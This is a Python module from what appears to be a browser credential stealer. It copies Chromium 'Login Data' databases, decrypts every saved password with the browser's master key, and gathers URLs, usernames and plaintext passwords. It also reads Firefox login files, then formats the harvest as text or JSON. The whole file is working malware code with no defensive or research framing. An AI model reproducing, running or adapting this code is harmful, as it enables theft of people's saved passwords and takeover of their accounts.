import os
import tempfile
import shutil
import sqlite3
import json
from utils import get_master_key, DecryptValue, get_all_browser_profiles, load_json_config, expand_path

def extract_passwords_chromium(browser_config):
    passwords = []
    
    for browser in browser_config.get("chromium_browsers", []):
        browser_path = expand_path(browser["path"])
        browser_name = browser["name"]
        password_path = browser["login_data"]
        
        if not os.path.exists(browser_path):
            continue
        
        master_key = get_master_key(browser_path)
        if not master_key:
            continue
        
        if password_path == "/":
            profiles = get_all_browser_profiles(browser_path)
        else:
            profiles = [password_path.lstrip("/")]
        
        for profile in profiles:
            login_db = os.path.join(browser_path, profile, "Login Data")
            
            if not os.path.exists(login_db):
                alt = os.path.join(browser_path, profile, "Login Data For Account")
                if os.path.exists(alt):
                    login_db = alt
                else:
                    continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{browser_name}_{profile}_{os.getpid()}.db")
            
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    
                    if not encrypted_password:
                        continue
                    
                    decrypted_password = DecryptValue(encrypted_password, master_key)
                    
                    if username or decrypted_password:
                        passwords.append({
                            "browser": browser_name,
                            "profile": profile,
                            "url": url,
                            "username": username,
                            "password": decrypted_password
                        })
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    
    return passwords

def extract_passwords_firefox(firefox_config):
    passwords = []
    firefox_data = firefox_config.get("firefox", {})
    firefox_path = expand_path(firefox_data.get("profiles_path", "{APPDATA}/Mozilla/Firefox/Profiles"))
    
    if not os.path.exists(firefox_path):
        return passwords
    
    for profile in os.listdir(firefox_path):
        profile_path = os.path.join(firefox_path, profile)
        
        if not os.path.isdir(profile_path):
            continue
        
        logins_json_name = firefox_data.get("databases", {}).get("passwords_json", "logins.json")
        signons_sqlite_name = firefox_data.get("databases", {}).get("passwords_sqlite", "signons.sqlite")
        
        logins_json = os.path.join(profile_path, logins_json_name)
        signons_sqlite = os.path.join(profile_path, signons_sqlite_name)
        
        if os.path.exists(logins_json):
            try:
                with open(logins_json, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    logins = data.get('logins', [])
                    
                    for login in logins:
                        url = login.get('hostname', 'N/A')
                        username = login.get('usernameField', 'N/A')
                        
                        passwords.append({
                            "browser": "Firefox",
                            "profile": profile,
                            "url": url,
                            "username": username,
                            "password": "[Encrypted]"
                        })
            except:
                pass
        
        if os.path.exists(signons_sqlite):
            temp_db = os.path.join(tempfile.gettempdir(), f"signons_{profile}_{os.getpid()}.db")
            
            try:
                shutil.copy2(signons_sqlite, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                cursor.execute("SELECT hostname FROM moz_logins")
                
                for row in cursor.fetchall():
                    url = row[0] if row[0] else 'N/A'
                    
                    passwords.append({
                        "browser": "Firefox",
                        "profile": profile,
                        "url": url,
                        "username": "[Encrypted]",
                        "password": "[Encrypted]"
                    })
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    
    return passwords

def extract_passwords():
    all_passwords = []
    
    browser_config = load_json_config("browser.json")
    firefox_config = load_json_config("firefox.json")
    
    all_passwords.extend(extract_passwords_chromium(browser_config))
    all_passwords.extend(extract_passwords_firefox(firefox_config))
    
    return all_passwords

def format_passwords(passwords):
    if not passwords:
        return None
    
    formatted = []
    for pwd in passwords:
        formatted.append(
            f"[{pwd['browser']} - {pwd['profile']}]\n"
            f"URL: {pwd['url']}\n"
            f"User: {pwd['username']}\n"
            f"Pass: {pwd['password']}\n"
            f"{'─'*40}"
        )
    
    return "\n".join(formatted)

def get_passwords():
    passwords = extract_passwords()
    return format_passwords(passwords)

def get_passwords_json():
    return extract_passwords()